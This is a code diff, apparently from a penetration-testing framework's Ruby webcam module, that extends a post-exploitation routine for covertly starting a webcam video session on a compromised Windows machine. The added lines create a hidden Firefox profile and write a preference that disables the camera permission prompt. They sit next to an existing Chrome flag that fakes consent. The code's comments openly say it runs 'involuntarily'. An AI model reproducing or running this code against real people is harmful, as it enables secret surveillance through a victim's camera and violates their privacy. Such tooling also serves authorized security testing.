@@ -137,6 +137,7 @@ class Webcam
 
   #
   # Creates a video chat session as an offerer... involuntarily :-p
+  # Winodws targets only.
   #
   # @param remote_browser_path [String] A browser path that supports WebRTC on the target machine
   # @param offerer_id [String] A ID that the answerer can look for and join
@@ -158,9 +159,19 @@ class Webcam
       raise RuntimeError, "Unable to initialize the interface on the target machine"
     end
 
+    #
+    # Automatically allow the webcam to run on the target machine
+    #
     args = ''
     if remote_browser_path =~ /Chrome/
       args = "--allow-file-access-from-files --use-fake-ui-for-media-stream"
+    elsif remote_browser_path =~ /Firefox/
+      profile_name = Rex::Text.rand_text_alpha(8)
+      o = cmd_exec("#{remote_browser_path} --CreateProfile #{profile_name} #{tmp_dir}\\#{profile_name}")
+      profile_path = (o.scan(/created profile '.+' at '(.+)'/).flatten[0] || '').strip
+      setting = %Q|user_pref("media.navigator.permission.disabled", true);|
+      write_file(profile_path, setting)
+      args = "-p #{profile_name}"
     end
 
     exec_opts = {'Hidden' => false, 'Channelized' => false}
